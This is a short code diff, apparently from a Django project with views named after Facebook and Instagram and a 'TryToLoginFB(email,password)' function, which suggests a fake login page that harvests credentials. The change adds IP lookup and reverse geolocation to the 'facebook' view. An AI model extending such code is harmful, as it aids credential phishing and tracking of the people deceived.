@@ -8,9 +8,12 @@ from .names_comments import names, comments, tupleNamesComments
 import urllib
 import http.cookiejar as cookielib
 from . import doLogin
+from . import ipinfo
 import socket
 import socket
 import requests
+from geopy.geocoders import Nominatim
+from requests import get
 # Create your views here.
 
 
@@ -37,8 +40,15 @@ def instagram(request):
 
 def facebook(request):
     hostname  = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    context = {'ip_address':ip_address, 'location_data':get_location(), 'sss':request.META.get('HTTP_X_REAL_IP')}
+    ip_address = get('https://api.ipify.org').text
+    ipData = get(f'http://ip-api.com/json/{ip_address}').text
+
+    geolocator = Nominatim(user_agent="geoapiExercises")
+    Latitude = ipinfo.ipinfo()['lat']
+    Longitude = ipinfo.ipinfo()['lon']
+    cityFromLonAndLat = geolocator.reverse(str(Latitude)+","+str(Longitude))
+
+    context = {'ip_address':ip_address, 'ipData':ipinfo.ipinfo(), 'cityFromLonAndLat':cityFromLonAndLat}
     return render(request, 'index.html', context)
 
 def TryToLoginFB(email,password):
